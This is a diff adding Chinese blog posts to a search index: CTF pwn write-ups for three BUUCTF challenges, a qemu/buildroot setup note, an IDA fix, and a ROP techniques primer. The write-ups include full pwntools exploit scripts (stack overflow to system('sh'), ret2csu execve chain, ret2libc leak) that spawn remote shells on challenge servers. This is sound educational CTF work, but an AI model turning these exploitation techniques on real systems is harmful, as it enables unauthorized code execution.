@@ -5734,6 +5734,96 @@
 
 <p>但是拿到shell之后发现flag居然不在根目录，少见</p>
 <p><img src="image-20201105120131498.png" alt="image-20201105120131498"></p>
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>首先检查安全机制</p>
+<p><img src="image-20201105215357163.png" alt="image-20201105215357163"></p>
+<p>开启了NX的32位程序</p>
+<p>运行后是一个输入password的地方</p>
+<p><img src="image-20201105215428495.png" alt="image-20201105215428495"></p>
+<p>反编译逆向看到</p>
+<p><img src="image-20201106113658304.png" alt="image-20201106113658304"></p>
+<p>输入administrator就可以过去，后面的程序是一个循环</p>
+<p>输出显示的只有4个选项，但是实际上看到switch中还有一个隐藏的选项</p>
+<p>AddLog这个选项通过scanf输入一个log，长度限制是128</p>
+<p><img src="image-20201106113741030.png" alt="image-20201106113741030"></p>
+<p>在GetFlag这个函数中有一个strcpy，但是这里的目标串dst距离ebp只有0x48</p>
+<p>因此有可能溢出</p>
+<p><img src="image-20201106113901780.png" alt="image-20201106113901780"></p>
+<p>在选项<code>Print</code>那里是用到了<code>system</code></p>
+<p>在程序中没有找到<code>/bin/sh</code></p>
+<p>但是存在<code>sh</code></p>
+<p>那么思路就是首先用第一个选项输入payload</p>
+<p>之后用选项4造成溢出并且调用<code>system(&quot;sh&quot;)</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28345</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n:&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]) +p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+ p32(sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(str(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>首先checksec</p>
+<p><img src="image-20201106160828730.png" alt="image-20201106160828730"></p>
+<p>开启了NX的64位程序</p>
+<p>这个程序比较奇怪，反编译了vuln函数之后可以看到</p>
+<p><img src="image-20201106161721030.png" alt="image-20201106161721030"></p>
+<p>是调用了一次read，一次write</p>
+<p>但这里没法直接看到具体调用的参数，用gdb跑起来看一下</p>
+<p>跑到read这里的时候的三个参数分别是</p>
+<p><img src="image-20201106161814576.png" alt="image-20201106161814576"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x400</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说从stdin读了最多0x400到栈上</p>
+<p>之后又调用了write函数，执行到这里的时候各个参数为</p>
+<p><img src="image-20201106162215451.png" alt="image-20201106162215451"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说从栈上的buf将0x30长度的内容写到stdout上</p>
+<p>但是这个vuln函数向下执行的时候就没办法正常的返回了，因为栈上已经都是’a’了</p>
+<p>计算一下偏移，81-65=16</p>
+<p>由于开启了NX，这个明显要用ROP了</p>
+<p>由于是64位的程序，很可能是ret2csu</p>
+<p>另外程序还给了一个gadget的函数，里面存在几个可以用到的gadget</p>
+<p><img src="image-20201106221342423.png" alt="image-20201106221342423"></p>
+<p>这一个函数中给到了三个gadget</p>
+<p>这里给出的一个<code>mov rax,3Bh; retn</code></p>
+<p>之后可以尝试去调用<code>syscall</code>，因为<code>3Bh</code>对应的59在系统调用号中正好是<code>execve</code></p>
+<p><img src="image-20201106221705844.png" alt="image-20201106221705844"></p>
+<p>全部的系统调用号对应表：<a href="https://www.cnblogs.com/tcctw/p/11450449.html">https://www.cnblogs.com/tcctw/p/11450449.html</a></p>
+<p>如果我们想要执行<code>execve(&quot;/bin/sh&quot;)</code>，那么就需要在栈中存储这个字符串，之后将这个字符串的地址赋给rdi，最后调用execve</p>
+<p>在执行到write的那个syscall时，栈中rsi指向了栈中的buffer</p>
+<p><img src="image-20201106225441796.png" alt="image-20201106225441796"></p>
+<p>由于这里输出的是0x30的内容，此时栈顶是从上面字符串c开始的位置</p>
+<p><img src="image-20201106225608750.png" alt="image-20201106225608750"></p>
+<p>因此输出0x30的内容的话，会将栈中另外两个内容输出出来，这其中恰好有一个是指向栈上的地址</p>
+<p>在上面的图中就是<code>0x00007fffffffde38</code>以及另外一个<code>0x0000000100000000</code></p>
+<p>这个<code>de38</code>距离我们字符串的开头<code>dd20</code>相差了<code>0x118</code></p>
+<p>我们就可以用得到的这个值进行定位</p>
+<p>至于调用execve的过程，首先将rax设置为execve的调用号</p>
+<p>之后ret回来之后设置一下几个寄存器中的值</p>
+<p>需要注意的是，execve函数在调用时，实际上需要三个参数，最开始尝试直接运行<code>execve(&#39;/bin/sh&#39;)</code>失败了，网上查了说后面两个参数需要为0，也就是说在运行时我们需要令<code>rdi=*&quot;/bin/sh&quot;</code>, <code>rsi=0</code>, <code>rdx=0</code></p>
+<p>但是在gadget中搜索没有找到为rdx赋值的gadget</p>
+<p>我们就只能是用到ret2csu来控制rdx的值了</p>
+<p>首先执行<code>__libc_start_main</code>中的后面一部分pop</p>
+<p><img src="image-20201107111533619.png" alt="image-20201107111533619"></p>
+<p>之后执行前面那一块的mov</p>
+<p><img src="image-20201107111556821.png" alt="image-20201107111556821"></p>
+<p>这里我们的目的是给rdx赋值，所以需要控制r13</p>
+<p>由于我们设置rbx=0，实际上call的位置就是r12寄存器控制的，这里设置r12的值为栈上当前下一个地址，即pop_rdi的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(rax_3b) </span><br><span class="line">payload += p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(r15)</span><br><span class="line">payload += p64(csu_mov)</span><br><span class="line">payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)</span><br></pre></td></tr></table></figure>
+
+<p>写的时候发现一个问题就是第一次payload回来的位置不对，这个程序经过了一次调用vuln，所以回来的地址应该是<code>elf.sym[&#39;vuln&#39;]</code>，之前写成<code>main</code>就错了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29878</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">payload_addr = u64(io.recv(<span class="number">0x8</span>)) - <span class="number">0x118</span></span><br><span class="line">print(<span class="string">&#x27;payload address is:&#x27;</span>,hex(payload_addr))</span><br><span class="line">io.recv(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">rax_3b = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">csu_pop = <span class="number">0x40059A</span></span><br><span class="line">csu_mov = <span class="number">0x400580</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(rax_3b)</span><br><span class="line">payload += p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(payload_addr + <span class="number">0x58</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_mov)</span><br><span class="line">payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个题目还可以用SROP来做，之后有机会再写。</p>
+<h2 id="铁人三项-2018-rop"><a href="#铁人三项-2018-rop" class="headerlink" title="铁人三项_2018_rop"></a>铁人三项_2018_rop</h2><p>首先检查安全机制</p>
+<p><img src="image-20201107141506926.png" alt="image-20201107141506926"></p>
+<p>开启了NX的32位程序</p>
+<p>main函数反编译后发现里面按顺序调用了两个函数</p>
+<p><img src="image-20201107141740396.png" alt="image-20201107141740396"></p>
+<p>其中vulnerable_function存在溢出</p>
+<p><img src="image-20201107141800487.png" alt="image-20201107141800487"></p>
+<p>没有在程序中找到system、binsh这些</p>
+<p>所以就当作ret2libc来做</p>
+<p>首先用write输出write或read的got表中的真实地址，之后用LibcSearcher查libc的版本</p>
+<p>最后计算system、binsh的偏移拿shell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27746</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">plt_write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(address=read_real,func=<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">libc.add_condition(address=write_real,func=<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = read_real - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>buuctf</category>
@@ -6507,7 +6597,98 @@
   <entry>
     <title>macOS上的qemu</title>
     <url>/2020/10/30/macOS%E4%B8%8A%E7%9A%84qemu/</url>
-    <content><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/wpcnblog/p/11516234.html">qemu支持的网络模式</a></p>
+    <content><![CDATA[<p>主要是想用qemu的系统模式来调试路由器里的二进制程序，如果用linux虚拟机再加一层qemu有点套娃，而且没办法用mac里的IDA连接过去调试。</p>
+<p>这里记录一下配置各种环境的坑；</p>
+<h2 id="buildroot编译gdb和gdbserver"><a href="#buildroot编译gdb和gdbserver" class="headerlink" title="buildroot编译gdb和gdbserver"></a>buildroot编译gdb和gdbserver</h2><p>buildroot本身是可以编译出一套固件，同时还可以配置好host机的调试环境以及交叉编译的环境；</p>
+<p>配置buildroot的博客还是有不少的，但是质量感人；</p>
+<h3 id="配置buildroot"><a href="#配置buildroot" class="headerlink" title="配置buildroot"></a>配置buildroot</h3><p>首先下载buildroot，官网<a href="https://buildroot.org/">buildroot.org</a></p>
+<p>下载下来之后解压，之后准备编译，依赖的话需要一个<code>libncurse-dev</code>，其他的包一般应该都有装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
+
+<p>进入一个选择界面</p>
+<p><img src="macOS%E4%B8%8A%E7%9A%84qemu/image-20201106151300225.png" alt="image-20201106151300225"></p>
+<p>首先简单介绍一下交叉编译时的几个选项</p>
+<ul>
+<li><code>host</code></li>
+<li><code>target</code></li>
+<li></li>
+</ul>
+<p>在buildroot编译时可能遇到的问题：</p>
+<h3 id="报错137"><a href="#报错137" class="headerlink" title="报错137"></a>报错137</h3><p>Error 137，这个错误出现的原因是因为swap空间不足</p>
+<p>解决方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@~: su</span><br><span class="line">root@/home/user: dd <span class="keyword">if</span>=/dev/zero of=/home/swap bs=1024 count=2048000</span><br><span class="line">root@/home/user: mkswap /home/swap</span><br><span class="line">root@/home/user: swapon /home/swap</span><br></pre></td></tr></table></figure>
+
+<p>这样新增一个swap分区之后再编译时就不会出现这个报错了</p>
+<p>如果要检查一下swap分区是否加载了进去</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure>
+
+<p>可以看到目前的内存和swap分区使用情况</p>
+<h2 id="gdb连接到gdbserver时报错"><a href="#gdb连接到gdbserver时报错" class="headerlink" title="gdb连接到gdbserver时报错"></a>gdb连接到gdbserver时报错</h2><p>在调试qemu模拟的设备时一般需要将gdbserver上传到qemu模拟的系统中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ignoring packet error, continuing...</span><br><span class="line">warning: unrecognized item &quot;timeout&quot; in &quot;qSupported&quot; response</span><br><span class="line">Ignoring packet error, continuing...</span><br><span class="line">Remote replied unexpectedly to &#39;vMustReplyEmpty&#39;: timeout</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/wpcnblog/p/11516234.html">qemu支持的网络模式</a></p>
 ]]></content>
+      <tags>
+        <tag>linux</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IDA反编译出错</title>
+    <url>/2020/11/06/IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%87%BA%E9%94%99/</url>
+    <content><![CDATA[<h2 id="报错Decompile-Error"><a href="#报错Decompile-Error" class="headerlink" title="报错Decompile Error"></a>报错Decompile Error</h2><p>提示为某一个地址analysis failed</p>
+<p><img src="IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%87%BA%E9%94%99/image-20201106111005929.png" alt="image-20201106111005929"></p>
+<p>找到这个对应的地址，发现是一个<code>call scanf</code></p>
+<p>可能是这个<code>scanf</code>的参数解析出现了错误</p>
+<p>在scanf上按Y重新定义</p>
+<p>写上正确的定义</p>
+<p><img src="IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%87%BA%E9%94%99/image-20201106111142655.png" alt="image-20201106111142655"></p>
+<p>之后就可以反编译了</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ROP进阶</title>
+    <url>/2020/11/06/ROP%E8%BF%9B%E9%98%B6/</url>
+    <content><![CDATA[<p>ROP本身原理还是比较好理解的，简单的ROP做了一些题之后就比较熟练了，更难的ROP还是要一点一点学一下原理；</p>
+<p>记一下各种类型的ROP原理；</p>
+<a id="more"></a>
+
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>最基本的ROP，溢出返回地址之后跳到text节，这种情况一般只有在NX没有开启时才可能</p>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>在栈不可执行被开启后，如果程序中存在关键的系统调用，如<code>system</code>、<code>execve</code>等，就可以返回到这里；</p>
+<p>覆盖了返回地址之后填成相应的函数，调用<code>system</code>等等</p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>有时候可能可以在内存中写入可控的shellcode，但是在开启了NX后栈是不可执行的；</p>
+<p>因此shellcode就需要写如到如bss段这样的区域，并且可能还需要通过mprotect修改bss段的写权限和执行权限</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>在程序本身没有引入我们需要的函数，如<code>system</code>、<code>execve</code>等时，我们可以采用这样的方法。</p>
+<p>使用ret2libc需要首先知道libc在内存中的加载基地址，一般需要通过write、puts、printf这样的函数首先输出程序中某个函数在内存中的地址，根据这个地址计算出libc在内存中的基地址。</p>
+<p>之后用基地址加上相应想要调用函数在libc中的偏移就可以跳到libc中某个特定函数处了。</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>上面的一些rop都是比较基本的类型，原理都很清楚了，平时也用的比较多，从这个开始就属于比较难一些，用到了一些奇奇怪怪得机制的rop。</p>
+<p>在64位的程序中，函数调用时传参的顺序是优先经过寄存器的，前六个参数分别是放在rdi, rsi, rdx, rcx, r8, r9</p>
+<p>但是在程序中不一定都会存在<code>pop rdi; ret;</code>这样的gadget，想要同时控制这些寄存器的值就可以用到ret2csu</p>
+<p>这里最主要用到的一个函数就是<code>__libc_csu_init</code></p>
+<p>这个函数是libc在初始化时用到的，因此一般程序都会调用到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400540 __libc_csu_init proc near               </span><br><span class="line">.text:0000000000400540 ; __unwind &#123;</span><br><span class="line">.text:0000000000400540                 push    r15</span><br><span class="line">.text:0000000000400542                 push    r14</span><br><span class="line">.text:0000000000400544                 mov     r15d, edi</span><br><span class="line">.text:0000000000400547                 push    r13</span><br><span class="line">.text:0000000000400549                 push    r12</span><br><span class="line">.text:000000000040054B                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552                 push    rbp</span><br><span class="line">.text:0000000000400553                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A                 push    rbx</span><br><span class="line">.text:000000000040055B                 mov     r14, rsi</span><br><span class="line">.text:000000000040055E                 mov     r13, rdx</span><br><span class="line">.text:0000000000400561                 sub     rbp, r12</span><br><span class="line">.text:0000000000400564                 sub     rsp, 8</span><br><span class="line">.text:0000000000400568                 sar     rbp, 3</span><br><span class="line">.text:000000000040056C                 call    _init_proc</span><br><span class="line">.text:0000000000400571                 test    rbp, rbp</span><br><span class="line">.text:0000000000400574                 jz      short loc_400596</span><br><span class="line">.text:0000000000400576                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400578                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580 loc_400580:                             </span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             </span><br><span class="line">.text:0000000000400596                 add     rsp, 8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br><span class="line">.text:00000000004005A4 ; &#125; &#x2F;&#x2F; starts at 400540</span><br><span class="line">.text:00000000004005A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>不同的版本可能存在一些差异，这是一道题目中的例子</p>
+<p>这个函数存在这些特点：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br></pre></td></tr></table></figure>
+
+<p>最后一部分又连续的一段pop，这里我可以通过控制栈上的数据，之后调用这里的gadget，使得<code>rbx</code>、<code>rbp</code>、<code>r12</code>、<code>r13</code>、<code>r14</code>、<code>r15</code>几个寄存器都可以被我们控制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+
+<p>这一段代码可以让我们控制rdx、rsi、edi，其中edi这里其实高32位为全0，所以其实也可以控制rdi，但是只能设置其中低32位的值，这三个寄存器是64位程序传参时的前三个参数的位置</p>
+<p>最后的那个call，我们也可以通过前面的一串pop，来控制rbx和r12的值，使得call到我们想去的地方</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br></pre></td></tr></table></figure>
+
+<p>在上面的一串代码执行结束后来到下面这样一个判断，这里可以设置rbx和rbp的值为<code>rbx+1=rbp</code></p>
+<p>这样在这一块前面的call执行结束后就不会跳回去，可以继续执行后面的程序</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
   </entry>
 </search>
